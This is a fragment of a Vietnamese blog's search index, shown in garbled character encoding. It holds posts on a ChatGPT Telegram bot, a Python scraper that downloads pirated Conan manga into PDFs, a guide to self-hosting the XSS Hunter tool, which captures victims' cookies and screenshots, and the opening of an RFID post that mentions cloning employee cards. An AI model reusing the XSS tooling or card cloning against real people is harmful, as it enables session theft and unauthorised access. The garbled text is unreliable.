c·∫ßn ch·ªù 3-5s l√† c√≥ k·∫øt qu·∫£ r·ªìi, tuy nhi√™n v·∫´n b·ªã gi·ªõi h·∫°n 1 c√¢u tr·∫£ l·ªùi ƒë∆∞·ª£c √≠t ch·ªØ ch·ª© v·∫´n ch∆∞a ƒë∆∞·ª£c nhi·ªÅu ch·ªØ :| C√≥ th·ªÉ add bot v√†o 1 nh√≥m d√πng chung ƒë∆∞·ª£c, tuy nhi√™n ng∆∞·ªùi kia ƒëang h·ªèi th√¨ c·∫ßn ph·∫£i ch·ªù, ch·ªù ng∆∞·ªùi kia h·ªèi xong th√¨ bot m·ªõi rep ti·∫øp ƒë∆∞·ª£c.  Do s·ª≠ d·ª•ng API c·ªßa OpenAI th√¨ m·∫•t ti·ªÅn, tuy nhi√™n khi t·∫°o t√†i kho·∫£n c√°c b·∫°n s·∫Ω ƒë∆∞·ª£c 18$ free, nh∆∞ng n√≥ c√≥ th·ªùi h·∫°n s·ª≠ d·ª•ng, n·∫øu h·∫øt th·ªùi h·∫°n s·ª≠ d·ª•ng th√¨ s·∫Ω kh√¥ng c√≤n d√πng ƒë∆∞·ª£c API n·ªØa ƒë√¢u nh√© :joy: https://platform.openai.com/account/usage Hi v·ªçng l√† s·∫Ω gi√∫p ƒë∆∞·ª£c c√°c b·∫°n l∆∞·ªùi nh∆∞ m√¨nh :joy: Nh√¢n d·ªãp nƒÉm m·ªõi, ch√∫c c√°c b·∫°n c√≥ m·ªôt nƒÉm m·ªõi b√¨nh an, ho√†n th√†nh t·ªët nh·ªØng ƒëi·ªÅu g√¨ mong mu·ªën trong nƒÉm 2023 t·ªõi, see you!\n","permalink":"https://minhtuanact.ml/posts/build-chatgpt-telegram-bot-do-phai-login-daily-limits/","summary":"Ch·∫Øc h·∫≥n c√≥ l·∫Ω nhi·ªÅu b·∫°n s·ª≠ d·ª•ng ChatGPT g·∫∑p t√¨nh tr·∫°ng qu√° t·∫£i nh∆∞ th·∫ø n√†y tr√™n phi√™n b·∫£n web, c≈©ng ƒë√∫ng v√¨ ChatGPT tƒÉng tr∆∞·ªüng qu√° kh·ªßng khi·∫øp, 100 tri·ªáu ng∆∞·ªùi d√πng trong v√≤ng c√≥ 60 ng√†y, m·∫•t 30 tri·ªáu ƒë√¥ ƒë·ªÉ duy tr√¨ h·ªá th·ªëng. Hi·ªán t·∫°i s·∫Øp t·ªõi ChatGPT c√≥ ra m·∫Øt phi√™n b·∫£n ChatGPT Plus v·ªõi gi√° $20/th√°ng, t∆∞∆°ng ·ª©ng v√†o kho·∫£ng 1,5% ng∆∞·ªùi d√πng hi·ªán t·∫°i s·ª≠ d·ª•ng th√¨ m·ªõi ƒë·ªß b√π v√†o ti·ªÅn duy tr√¨ h·ªá th·ªëng kia.","title":"Build ChatGPT Telegram bot, ƒë·ª° ph·∫£i login, daily limits"},{"content":"M√¨nh l√† m·ªôt ng∆∞·ªùi th√≠ch ƒë·ªçc, sau m·ªôt th·ªùi gian ƒë·ªçc nh·ªØng truy·ªán voz bu·ªìn c·ª© ph·∫£i g·ªçi l√† \u0026hellip; nh∆∞ Ranh Gi·ªõi c·ªßa rain8x, hay Ng√†y H√¥m Qua ƒê√£ T·ª´ng c·ªßa Nguy·ªÖn Mon, ..v.v. v√† h·∫±ng h√† sa s·ªë truy·ªán ch·ªØ kh√°c th√¨ m√¨nh quy·∫øt ƒë·ªãnh chuy·ªÉn sang ƒë·ªçc truy·ªán tranh (ng∆∞·ªùi ƒë·ªùi g·ªçi nh∆∞ v·∫≠y ch·ª© to√†n th·∫•y ae g·ªçi l√† ƒë·ªçc manga). Th·∫≠t t√¨nh c·ªù m√¨nh c≈©ng c√≥ c√°i m√°y kindle ƒë·ªÉ ƒë·ªçc s√°ch (ng·ª±a ng·ª±a mua v·ªÅ ƒë·ªÉ ƒë·ªçc s√°ch ch·ª© to√†n ƒë·ªçc truy·ªán tranh l√† ch√≠nh), down m·∫•y truy·ªán Conan tr√™n m·∫°ng (ng∆∞·ªùi ta g·ªçi ƒë√≥ l√† s√°ch l·∫≠u) copy v√†o Kindle ppw4 th√¨ c·∫£m th·∫•y h∆°i m·ªù + b·ªã k√©o gi√£n h√¨nh ra tr√¥ng x·∫•u m√π, ƒë·∫ßu Conan h√¨nh tr√≤n n√≥ k√©o th√†nh h√¨nh c√°i b√°nh m√¨ lu√¥n. L√† m·ªôt ng∆∞·ªùi th√≠ch gi·ªØ nh·ªØng g√¨ b·∫£n nguy√™n nh·∫•t c·ªßa truy·ªán, m√¨nh ƒë√£ quy·∫øt ƒë·ªãnh ƒëi t√¨m ngu·ªìn truy·ªán Th·∫ßn ch·∫øt Conan - √† nh·∫ßm, Th√°m t·ª≠ l·ª´ng danh Conan ph·∫£i v·ª´a ƒë·∫πp v·ª´a n√©t v·ª´a b·∫£n nguy√™n nh∆∞ nh·ªØng g√¨ ƒë√°ng ra n√≥ ph·∫£i nh∆∞ th·∫ø.\nSau m·ªôt th·ªùi gian t√¨m ki·∫øm th√¨ m√¨nh c≈©ng t√¨m ƒë∆∞·ª£c trang https://thamtu-conan.blogspot.com/ c√≥ ƒë·∫ßy ƒë·ªß nh·ªØng g√¨ m√¨nh mong mu·ªën. ƒê·ªçc truy·ªán tr√™n m√°y t√≠nh th√¨ ƒëau m·∫Øt n√™n m√¨nh quy·∫øt ƒë·ªãnh vi·∫øt 1 script crawl truy·ªán t·ª´ trang n√†y v·ªÅ v√† ƒë√≥ng g√≥i l·∫°i ƒë·ªÉ ƒë·ªçc tr√™n m√°y Kindle. V√† b√™n d∆∞·ªõi ƒë√¢y l√† c√¢u chuy·ªán m√† m√¨nh ƒëi ng·ªìi crawl truy·ªán n√®.\nVi·∫øt script ƒê·∫ßu ti√™n l√† ph·∫£i ng·ªìi ph√¢n t√≠ch c·∫•u tr√∫c trang web n√†y ƒë√£, trang n√†y ƒë∆∞·ª£c c√°i l√† ph√¢n t√≠ch c≈©ng d·ªÖ :rofl:\nget_chapter(chapter): C√≥ c√°c label ƒë·ªÉ chia ra c√°c t·∫≠p, m·ªói t·∫≠p c√≥ nhi·ªÅu chapter, ƒë·∫ßu ti√™n l√† m√¨nh vi·∫øt script ƒë·ªÉ get to√†n b·ªô chapter c·ªßa m·ªôt t·∫≠p v·ªÅ ƒë√£\n1 2 3 4 5 6 7 8 9  def get_chapter(chapter): links = [] response = requests.get( \u0026#34;https://thamtu-conan.blogspot.com/search/label/Conan%20T%E1%BA%ADp%20\u0026#34;+str(chapter)) response = BeautifulSoup(response.text, \u0026#34;html.parser\u0026#34;) response = response.find_all(\u0026#34;h2\u0026#34;, class_=\u0026#34;post-title\u0026#34;) # get all link for i in response: links.append(i.find(\u0026#34;a\u0026#34;).get(\u0026#34;href\u0026#34;)) return links   ·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng bs4 ƒë·ªÉ ph√¢n t√°ch code html, l·∫•y code t·ª´ ƒëo·∫°n h2 v·ªõi class post-title v√¨ b√™n trong n√≥ c√≥ c√°i link chapter :roll_eyes:\nSau ƒë√≥ l·∫•y to√†n b·ªô link trong k·∫øt qu·∫£ tr·∫£ v·ªÅ l√† ch√∫ng ta c√≥ 1 danh s√°ch links chapter cmnr.\nget_images(link): L·∫•y ƒë∆∞·ª£c to√†n b·ªô link chapter r·ªìi th√¨ download to√†n b·ªô image trong ƒë√≥ v·ªÅ th√¥i\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  def get_images(link): fnames = [] response = requests.get(link) response = BeautifulSoup(response.text, \u0026#34;html.parser\u0026#34;) response = response.find_all(\u0026#34;div\u0026#34;, class_=\u0026#34;post-body\u0026#34;) for i in response: images = i.find_all(\u0026#34;img\u0026#34;) for j in range(len(images)): try: with requests.get(images[j].get(\u0026#34;src\u0026#34;), timeout=10) as r: with open(\u0026#34;images/\u0026#34;+str(j)+\u0026#34;.jpg\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(r.content) fnames.append(str(j)+\u0026#34;.jpg\u0026#34;) print(\u0026#34;Saved \u0026#34;+str(j)+\u0026#34;.jpg\u0026#34;) except: print(\u0026#34;requests error\u0026#34;) return fnames # return list of filenames   Ti·∫øp t·ª•c s·ª≠ d·ª•ng bs4 ƒë·ªÉ l·∫•y to√†n b·ªô code ·ªü th·∫ª div, class post-body (v√¨ trong ƒë√≥ c√≥ ch·ª©a to√†n b·ªô ·∫£nh), sau ƒë√≥ t√¨m ki·∫øm to√†n b·ªô th·∫ª img r·ªìi download v·ªÅ theo th·ª© t·ª±. ·ªû ƒë√¢y m√¨nh c√≥ return l·∫°i to√†n b·ªô filenames ƒë·ªÉ d√πng cho ch·ª©c nƒÉng v·ªÅ sau\nsave_pdf(fnames, chapter): 1 2 3 4 5 6 7 8 9 10  def save_pdf(fnames, chapter): with open(chapter, \u0026#34;wb\u0026#34;) as f: fnames = [os.path.join(\u0026#34;images\u0026#34;, i) for i in fnames] f.write(img2pdf.convert(fnames)) print(\u0026#34;Saved \u0026#34;+chapter) try: for i in fnames: os.remove(i) except: print(\u0026#34;Cannot remove file\u0026#34;)   L·∫•y ƒë∆∞·ª£c to√†n b·ªô ·∫£nh r·ªìi th√¨ m√¨nh s·∫Ω gh√©p to√†n b·ªô ·∫£nh c·ªßa 1 chapter v√†o 1 file pdf. M√¨nh d√πng img2pdf ƒë·ªÉ gh√©p to√†n b·ªô ·∫£nh th√†nh 1 file pdf cho l·∫π. ·ªû ƒë√¢y m√¨nh c·∫ßn ph·∫£i c√≥ list filenames m√¨nh n√≥i b√™n tr√™n ƒë·ªÉ √©p v√†o code cho n√≥ ng·∫Øn g·ªçn, c√°c b·∫°n c≈©ng c√≥ th·ªÉ ƒë·ªçc to√†n b·ªô file trong folder r·ªìi gh√©p l·∫°i c≈©ng ƒë∆∞·ª£c, c≈©ng l√† m·ªôt c√°ch.\nM√¨nh c√≥ th√™m code xo√° lu√¥n c√°i ·∫£nh ƒëi ƒë·ªÉ ƒë·ª° t·ªën b·ªô nh·ªõ, gh√©p v√†o l·∫•y m·ªói file pdf th√¥i.\nget_chapter_full(): 1 2 3 4 5 6 7 8 9 10 11  def get_chapter_full(): links = [] response = requests.get(\u0026#34;https://thamtu-conan.blogspot.com/\u0026#34;) response = BeautifulSoup(response.text, \u0026#34;html.parser\u0026#34;) response = response.find_all( \u0026#34;div\u0026#34;, class_=\u0026#34;widget-content\u0026#34;) # get all link response = response[1].find_all(\u0026#34;a\u0026#34;) for i in response: if i.get(\u0026#34;href\u0026#34;).endswith(\u0026#34;.html\u0026#34;): links.append(i.get(\u0026#34;href\u0026#34;)) return links   ƒêo·∫°n n√†y m√¨nh vi·∫øt th√™m ƒë·ªÉ l·∫•y to√†n b·ªô links c·ªßa c√°c t·∫≠p hi·ªán c√≥ tr√™n web (links danh s√°ch b√™n d∆∞·ªõi n√®), c√≤n n·∫øu mu·ªën download t·ª´ng t·∫≠p th√¨ c√≥ th·ªÉ d√πng h√†m get_chapter(chapter) ƒë·ªÉ ch·ªâ ƒë·ªãnh c·ª• th·ªÉ t·∫≠p n√†o.\nmain: M·ªçi th·ª© xong r·ªìi, gi·ªù ƒë·∫øn l√∫c ch·∫°y script th√¥i :D\n V·ªõi nh·ªØng ai mu·ªën download t·ª´ t·∫≠p 1 ƒë·∫øn t·∫≠p cu·ªëi lu√¥n th√¨ d√πng main nh∆∞ n√†y  1 2 3 4  if __name__ == \u0026#34;__main__\u0026#34;: links = get_chapter_full() for i in links: save_pdf(get_images(i), i.split(\u0026#34;/\u0026#34;)[-1].split(\u0026#34;.\u0026#34;)[0]+\u0026#34;.pdf\u0026#34;)    V·ªõi nh·ªØng ai mu·ªën download t·∫≠p c·ª• th·ªÉ th√¨ c√≥ th·ªÉ d√πng nh∆∞ n√†y  1 2 3 4 5  if __name__ == \u0026#34;__main__\u0026#34;: for chapter in range(66, 67): links = get_chapter(chapter) for i in links: save_pdf(get_images(i), i.split(\u0026#34;/\u0026#34;)[-1].split(\u0026#34;.\u0026#34;)[0]+\u0026#34;.pdf\u0026#34;)   Nh·ªõ import th∆∞ vi·ªán c·ªßa python v√†o ƒë·ªÉ d√πng n·ªØa nh√©\n1 2 3 4 5 6  import requests from bs4 import BeautifulSoup import re import img2pdf from PIL import Image import os   Ch√∫ √Ω Code b√™n tr√™n ch·ªâ d√πng ƒë·ªÉ download c√°c chapter, ƒë·ªÉ gh√©p c√°c chapter th√†nh c√°c t·∫≠p th√¨ ph·∫£i vi·∫øt th√™m code n·ªØa ƒë·ªÉ merge v√†o\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  from PyPDF2 import PdfFileMerger import os # Create a list with file name list_pdf_files = os.listdir() pdf_files = [i for i in list_pdf_files if i.endswith(\u0026#34;.pdf\u0026#34;)] for i in range(66, 67): merger = PdfFileMerger() try: for files in pdf_files: if files.startswith(\u0026#34;conan-tap-\u0026#34;+str(i)+\u0026#34;-\u0026#34;): merger.append(files) merger.write(\u0026#34;ebooks/conan-tap-\u0026#34;+str(i)+\u0026#34;.pdf\u0026#34;) print(\u0026#34;Saved conan-tap-\u0026#34;+str(i)+\u0026#34;.pdf\u0026#34;) merger.close() except: print(\u0026#34;Cannot merge file\u0026#34;)   V·∫≠y l√† xong, qu√° tr√¨nh ƒëi k√©o s√°ch l·∫≠u c≈©ng kh√¥ng ph·∫£i d·ªÖ d√†ng g√¨ m√† \u0026hellip;\n","permalink":"https://minhtuanact.ml/posts/crawl-truyen-conan-de-copy-vao-may-doc-sach/","summary":"M√¨nh l√† m·ªôt ng∆∞·ªùi th√≠ch ƒë·ªçc, sau m·ªôt th·ªùi gian ƒë·ªçc nh·ªØng truy·ªán voz bu·ªìn c·ª© ph·∫£i g·ªçi l√† \u0026hellip; nh∆∞ Ranh Gi·ªõi c·ªßa rain8x, hay Ng√†y H√¥m Qua ƒê√£ T·ª´ng c·ªßa Nguy·ªÖn Mon, ..v.v. v√† h·∫±ng h√† sa s·ªë truy·ªán ch·ªØ kh√°c th√¨ m√¨nh quy·∫øt ƒë·ªãnh chuy·ªÉn sang ƒë·ªçc truy·ªán tranh (ng∆∞·ªùi ƒë·ªùi g·ªçi nh∆∞ v·∫≠y ch·ª© to√†n th·∫•y ae g·ªçi l√† ƒë·ªçc manga). Th·∫≠t t√¨nh c·ªù m√¨nh c≈©ng c√≥ c√°i m√°y kindle ƒë·ªÉ ƒë·ªçc s√°ch (ng·ª±a ng·ª±a mua v·ªÅ ƒë·ªÉ ƒë·ªçc s√°ch ch·ª© to√†n ƒë·ªçc truy·ªán tranh l√† ch√≠nh), down m·∫•y truy·ªán Conan tr√™n m·∫°ng (ng∆∞·ªùi ta g·ªçi ƒë√≥ l√† s√°ch l·∫≠u) copy v√†o Kindle ppw4 th√¨ c·∫£m th·∫•y h∆°i m·ªù + b·ªã k√©o gi√£n h√¨nh ra tr√¥ng x·∫•u m√π, ƒë·∫ßu Conan h√¨nh tr√≤n n√≥ k√©o th√†nh h√¨nh c√°i b√°nh m√¨ lu√¥n.","title":"Crawl truy·ªán Conan ƒë·ªÉ copy v√†o m√°y ƒë·ªçc s√°ch üò´"},{"content":"Ch·∫≥ng l√† ai l√† bug bounty hunter, pentester, researcher security c≈©ng ƒë√£ t·ª´ng bi·∫øt ƒë·∫øn c√¥ng c·ª• khai th√°c l·ªó h·ªïng XSS XSSHunter. C√¥ng c·ª• n√†y gi√∫p cho c√°c b·∫°n c√≥ th·ªÉ test, khai th√°c c√°c l·ªó h·ªïng XSS (nh∆∞ng ch·ªß y·∫øu l√† blind XSS), ho·∫∑c d√πng ƒë·ªÉ PoC cho c√°c Triager c·ªßa c√°c Platform Bug bounty verify cho n√≥ nhanh :joy:\nTuy nhi√™n, @IAmMandatory ƒë√£ th√¥ng b√°o r·∫±ng XSS Hunter s·∫Øp ƒë∆∞·ª£c shutdown :cry:\nTuy nhi√™n XSS Hunter l√† open source, nhanh tr√≠ deploy l√™n server c·ªßa m√¨nh th√¥i, t·ª± host cho n√≥ ƒë·ª° ph·∫£i d·ª±a v√†o s·ªëng ch·∫øt c·ªßa ng∆∞·ªùi kh√°c :rofl:\nXSS Hunter l√† g√¨? XSS Hunter cho ph√©p b·∫°n t√¨m th·∫•y t·∫•t c·∫£ c√°c lo·∫°i l·ªó h·ªïng cross-site scripting (XSS) tr√™n web, bao g·ªìm c·∫£ Blind XSS th∆∞·ªùng b·ªã b·ªè qua (cƒÉn b·∫£n l√† m√¨nh c√≥ th·∫•y ƒë√¢u, ph·∫£i ch√®n payload v√†o ƒë·ªÉ l·ª° ƒë√¢u ng∆∞·ªùi kh√°c truy c·∫≠p v√† trigger XSS l√™n m·ªõi bi·∫øt ƒë∆∞·ª£c). D·ªãch v·ª• n√†y ho·∫°t ƒë·ªông b·∫±ng c√°ch l∆∞u c√°c payload XSS chuy√™n d·ª•ng, s·ª≠ d·ª•ng JS ƒë·ªÉ ch·ª•p m√†n h√¨nh, cookie, \u0026hellip; r·ªìi g·ª≠i ƒë·∫øn server c·ªßa XSS Hunter. T·ª´ ƒë√≥ ch√∫ng ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c ai ƒë√£ trigger XSS, m√†n h√¨nh n√†o trigger XSS, \u0026hellip; (r·ªìi c√≤n ch·ª©ng minh l√† pass qua CSP n·ªØa). √Ä c√≥ m·ªôt c√°i ti·ªán n·ªØa l√† m·ªói khi XSS Hunter nh·∫≠n ƒë∆∞·ª£c d·ªØ li·ªáu, n√≥ s·∫Ω g·ª≠i email cho b·∫°n, v√† t·ª´ ƒë√≥ b·∫°n c√≥ th·ªÉ v√†o ki·ªÉm tra ngay l·∫≠p t·ª©c.\nC√†i ƒë·∫∑t XSS Hunter Express M·∫∑c d√π hi·ªán t·∫°i b·∫°n v·∫´n c√≥ th·ªÉ s·ª≠ d·ª•ng XSS Hunter, tuy nhi√™n nh∆∞ ƒë√£ th√¥ng b√°o th√¨ sang nƒÉm n√≥ s·∫Ω ƒë∆∞·ª£c shutdown, b·∫°n c·∫ßn ph·∫£i c√≥ server c·ªßa ri√™ng m√¨nh ho·∫∑c ai ƒë√≥ ƒë·ª©ng ra host ti·∫øp XSS Hunter ƒë·ªÉ b·∫°n d√πng k√© :D\nT·ª± host s·∫Ω gi√∫p ch√∫ng ta c√≥ th·ªÉ t·ª± l∆∞u tr·ªØ m·ªçi th·ª©, b·∫°n c√≥ quy·ªÅn ki·ªÉm so√°t t·∫•t c·∫£ ƒë·ªëi v·ªõi server ƒë√≥. Ngo√†i ra, ƒëi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng ch·ªâ b·∫°n m·ªõi c√≥ th·ªÉ xem k·∫øt qu·∫£ c·ªßa m√¨nh. B·∫°n c√≥ th·ªÉ nh·∫≠n ƒë∆∞·ª£c th√¥ng b√°o nhanh h∆°n, email kh√¥ng b·ªã v√†o th∆∞ m·ª•c spam n·ªØa :joy:. Ho·∫∑c b·∫°n c√≥ th·ªÉ code th√™m c√°i webhook ƒë·ªÉ post d·ªØ li·ªáu l√™n c√°c k√™nh chat nh∆∞ slack, discord, \u0026hellip; ƒë·ªÉ nh·∫≠n th√¥ng b√°o c√≤n nhanh h∆°n n·ªØa :laughing:\nHi·ªán t·∫°i XSS Hunter Express ƒëang ƒë∆∞·ª£c open source tr√™n Github\nhttps://github.com/mandatoryprogrammer/xsshunter-express (h∆°i √≠t star, m·ªçi ng∆∞·ªùi v√†o star cho t√°c gi·∫£ c√≥ th·ªÉ c·∫£i thi·ªán code, th√™m t√≠nh nƒÉng m·ªõi nhi·ªÅu h∆°n)\nC√†i ƒë·∫∑t DNS ƒê·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c XSS Hunter Express ch√∫ng ta c·∫ßn ph·∫£i c√≥ 1 t√™n mi·ªÅn, b·∫°n c√≥ th·ªÉ ƒëƒÉng k√Ω v√†i t√™n mi·ªÅn mi·ªÖn ph√≠ tr√™n https://dot.tk, https://freenom.com. ·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng Cloudflare ƒë·ªÉ c·∫•u h√¨nh DNS\nC·∫•u h√¨nh DNS theo config nh∆∞ h√¨nh tr√™n, s·ª≠ d·ª•ng Type A ƒë·ªÉ tr·ªè DNS v·ªÅ server m√¨nh s·∫Ω host XSS Hunter Express. Ph·∫ßn name c√°c b·∫°n c√≥ th·ªÉ ƒë·ªÉ ho·∫∑c kh√¥ng, n·∫øu ƒë·ªÉ n√≥ s·∫Ω l√† subdomain (nh∆∞ h√¨nh tr√™n domain s·∫Ω th√†nh xss.example.com), c√≤n kh√¥ng c√≥ name n√≥ s·∫Ω th√†nh domain root.\nC·∫•u h√¨nh XSS Hunter Express Khi c√†i ƒë·∫∑t xong DNS, ch√∫ng ta s·∫Ω SSH l√™n VPS c·ªßa m√¨nh, clone repo https://github.com/mandatoryprogrammer/xsshunter-express v·ªÅ r·ªìi ti·∫øp t·ª•c c·∫•u h√¨nh.\n1 2  git clone --depth 1 https://github.com/mandatoryprogrammer/xsshunter-express cd xsshunter-express   √Ä v·ªõi 1 y√™u c·∫ßu n·ªØa, ch√∫ng ta s·ª≠ d·ª•ng docker ƒë·ªÉ deploy, v·∫≠y c√°c b·∫°n c·∫ßn ph·∫£i c√†i docker v√† docker-compose ƒë·ªÉ c√≥ th·ªÉ deploy nh√© :D\nSau khi th·ª±c hi·ªán c√¢u l·ªánh tr√™n ch√∫ng ta s·∫Ω c√≥ c·∫•u tr√∫c th∆∞ m·ª•c nh∆∞ n√†y, th·ª±c hi·ªán ch·ªânh s·ª≠a file docker-compose.yml ƒë·ªÉ c·∫•u h√¨nh cho XSS Hunter. C√°c b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng editor m√† m√¨nh y√™u th√≠ch, ·ªü ƒë√¢y m√¨nh s·ª≠ d·ª•ng vim :joy:\n·ªû ƒë√¢y c√≥ m·ªôt v√†i gi√° tr·ªã m√† ch√∫ng ta c·∫ßn thay ƒë·ªïi\n HOSTNAME: ch·ªânh s·ª≠a gi√° tr·ªã n√†y theo domain c·ªßa c√°c b·∫°n v·ª´a ƒëƒÉng k√Ω ·ªü b∆∞·ªõc c√†i ƒë·∫∑t DNS SSL_CONTACT_EMAIL: XSSHunter s·∫Ω s·ª≠ d·ª•ng LetsEncrypt ƒë·ªÉ t·∫°o ch·ª©ng ch·ªâ SSL ƒë·ªÉ s·ª≠ d·ª•ng. Nh·∫≠p ƒë·ªãa ch·ªâ email s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng cho ch·ª©ng ch·ªâ SSL n√†y.  Ph·∫ßn SMTP s·∫Ω s·ª≠ d·ª•ng ƒë·ªÉ g·ª≠i email th√¥ng b√°o n·∫øu victim k√≠ch ho·∫°t XSS\n SMTP_USERNAME: ƒêi·ªÅn gmail c·ªßa c√°c b·∫°n v√†o ƒë√¢y SMTP_PASSWORD: Password c·ªßa gmail SMTP_FROM_EMAIL: Email c·ªßa b·∫°n SMTP_RECEIVER_EMAIL: Email m√† b·∫°n mu·ªën g·ª≠i  Ph·∫ßn gi√° tr·ªã c·ªßa Database c√°c b·∫°n c√≥ th·ªÉ ƒë·ªïi ho·∫∑c kh√¥ng c≈©ng ƒë∆∞·ª£c.\nCh·∫°y th√¥i! Sau khi c·∫•u h√¨nh th√†nh c√¥ng, ch√∫ng ta ch·ªâ c·∫ßn l√†m m·ªôt vi·ªác r·∫•t ƒë∆°n gi·∫£n, g√µ c√°i l·ªánh b√™n d∆∞·ªõi v√†o l√† xong\n1  docker-compose up   Vi·ªác c·ªßa c√°c b·∫°n b√¢y gi·ªù l√† ng·ªìi ch·ªù m√† th√¥i, ch·ªù cho docker l√†m vi·ªác c·ªßa m√¨nh. Pull m·∫•y c√°i image v·ªÅ r·ªìi t·ª± ƒë·ªông setup, c√†i ƒë·∫∑t letencrypt c√°c th·ª© (r·∫•t l√† ti·ªán).\nSetup xong xu√¥i n·∫øu hi·ªÉn th·ªã l√™n m√†n h√¨nh nh∆∞ n√†y l√† c√°c b·∫°n c√†i ƒë·∫∑t th√†nh c√¥ng r·ªìi ƒë·∫•y, c√≤n n·∫øu c√≥ bug th√¨ comment xu·ªëng d∆∞·ªõi b√†i vi·∫øt n√†y nh√©, m√¨nh bi·∫øt th√¨ m√¨nh s·∫Ω support :D\nV√† h√£y l∆∞u l·∫°i c√°i password ƒë·ªÉ truy c·∫≠p v√†o admin control panel, kh√¥ng l√† l·∫°i ƒëi t√¨m m·ªát ng∆∞·ªùi l·∫Øm :joy:\nTh·ª≠ truy c·∫≠p domain c·ªßa m√¨nh xem\nN√≥ s·∫Ω hi·ªÉn th·ªã c·∫£nh b√°o nh∆∞ n√†y, 1 v√†i d√≤ng th√¥ng b√°o l√† m√¨nh ƒëang s·ª≠ d·ª•ng XSS Hunter v·ªõi m·ª•c ƒë√≠ch test xss + ch∆°i bug bounty hunter cho vendor ƒë∆∞·ª£c bi·∫øt :joy:\nƒê·ªÉ v√†o ƒë∆∞·ª£c admin control panel th√¨ c√°c b·∫°n truy c·∫≠p https://xss.example.com/admin/ r·ªìi nh·∫≠p password v·ª´a n√£y l·∫•y ƒë∆∞·ª£c ·ªü terminal hi·ªÉn th·ªã ra. Ch√∫ng ta s·∫Ω ƒë∆∞·ª£c m·ªôt h·ªá th·ªëng tr√¥ng nh∆∞ n√†y\nC√≥ m·ªôt v√†i payload XSS Hunter cho m√¨nh s·∫µn, c√°c b·∫°n c√≥ th·ªÉ th·ª≠ ƒë·ªëi v·ªõi website n√†o ƒë√≥ d√≠nh XSS th·ª≠ xem\nTrang n√†o trigger XSS th√¨ XSS Hunter s·∫Ω ch·ª•p ·∫£nh m√†n h√¨nh trigger + c√°c th√¥ng tin c·∫ßn thi·∫øt g·ª≠i v·ªÅ h·ªá th·ªëng. C√°c b·∫°n c√≥ th·ªÉ ch·ª•p ·∫£nh l·∫°i r·ªìi g·ª≠i b√°o c√°o cho c√°c ch∆∞∆°ng tr√¨nh bug bounty l√† ngon r·ªìi :joy:\nC√≥ m·ªôt v√†i t√≠nh nƒÉng kh√°c n·ªØa ƒëang ch·ªù b·∫°n kh√°m ph√° :dog:\n Qua ƒë√¢y m√¨nh ƒë√£ h∆∞·ªõng d·∫´n c√°c b·∫°n deploy XSS Hunter Express ƒë·ªÉ ph√≤ng h·ªù xsshunter.com t√®o (m√† c≈©ng n√™n d√πng h·ªá th·ªëng c·ªßa m√¨nh cho n√≥ an to√†n v√† ·ªïn ƒë·ªãnh). N·∫øu c√≥ b·∫•t k·ª≥ l·ªói g√¨ c√°c b·∫°n c√≥ th·ªÉ comment b√™n d∆∞·ªõi b√†i vi·∫øt nh√©. See you :blush:\n Tham kh·∫£o  https://github.com/mandatoryprogrammer/xsshunter-express https://blog.intigriti.com/2021/08/18/hacker-tools-xsshunter/  ","permalink":"https://minhtuanact.ml/posts/setup-xss-hunter-express-self-hosted-de-khai-thac-xss/","summary":"Ch·∫≥ng l√† ai l√† bug bounty hunter, pentester, researcher security c≈©ng ƒë√£ t·ª´ng bi·∫øt ƒë·∫øn c√¥ng c·ª• khai th√°c l·ªó h·ªïng XSS XSSHunter. C√¥ng c·ª• n√†y gi√∫p cho c√°c b·∫°n c√≥ th·ªÉ test, khai th√°c c√°c l·ªó h·ªïng XSS (nh∆∞ng ch·ªß y·∫øu l√† blind XSS), ho·∫∑c d√πng ƒë·ªÉ PoC cho c√°c Triager c·ªßa c√°c Platform Bug bounty verify cho n√≥ nhanh :joy:\nTuy nhi√™n, @IAmMandatory ƒë√£ th√¥ng b√°o r·∫±ng XSS Hunter s·∫Øp ƒë∆∞·ª£c shutdown :cry:","title":"Setup XSS Hunter Express (self-hosted) ƒë·ªÉ khai th√°c XSS"},{"content":"B·ªØa l√¢u l√¢u r·ªìi m√¨nh c√≥ ƒë·ªçc ƒë∆∞·ª£c th√¥ng tin n√†y t·ª´ 1 page c√≥ t√≠ch xanh Th√¥ng tin real n√≥ ·ªü ƒë√¢y, c√°c b·∫°n c√≥ th·ªÉ v√†o ƒë·ªçc :D https://www.facebook.com/thongtinchinhphu/posts/pfbid0Uuqh9DKGVVES7T5ApQDepxa6WNw3YMuDtsMxFKERc5QttHWgBNvVJvVNVRZUNkxpl\n·ªú th√¨ m√¨nh c≈©ng c√≥ t√≠nh t√≤ m√≤, sao c√°i c√¥ng ngh·ªá RFID Vi·ªát Nam ƒëang √°p d·ª•ng cho thu ph√≠ kh√¥ng d·ª´ng (ETC) n√≥ l·∫°i ti√™n ti·∫øn th·∫ø, h∆°n c·∫£ Sing (th·∫≠t ra l√† m√¨nh bi·∫øt n√≥ c≈©ng c√°ch ƒë√¢y m·∫•y nƒÉm, h·ªìi c√≤n clone th·∫ª nh√¢n vi√™n ƒë·ªÉ d√πng, v√¨ ti·ªÅn ƒë·ªÅn th·∫ª nh√¢n vi√™n khi m·∫•t m·∫∑n qu√°, t·∫≠n 200k l·∫≠n :\u0026lt;)\nRFID RFID l√† m·ªôt c√¥ng ngh·ªá th·∫ª s·ª≠ d·ª•ng s√≥ng v√¥ tuy·∫øn kh√¥ng ti·∫øp x√∫c. ƒê∆∞·ª£c gi·ªõi thi·ªáu l·∫ßn ƒë·∫ßu v√†o 23 th√°ng 1 nƒÉm 1973, t·ª©c 49 nƒÉm tr∆∞·ªõc. N√≥ kh√° ph·ªï bi·∫øn ƒë·∫øn m·ª©c b·∫°n c√≥ th·ªÉ th·∫•y ·ªü b·∫•t k·ª≥ ƒë√¢u ·ªü th√†nh ph·ªë l·ªõn (·ªü qu√™ th√¨ √≠t th·∫•y h∆°n nh∆∞ng m√† v·∫´n c√≥): intercoms, th·∫ª ng√¢n h√†ng, th·∫ª nh√¢n vi√™n, th·∫ª g·ª≠i xe, r·ªìi c√≥ c·∫£ 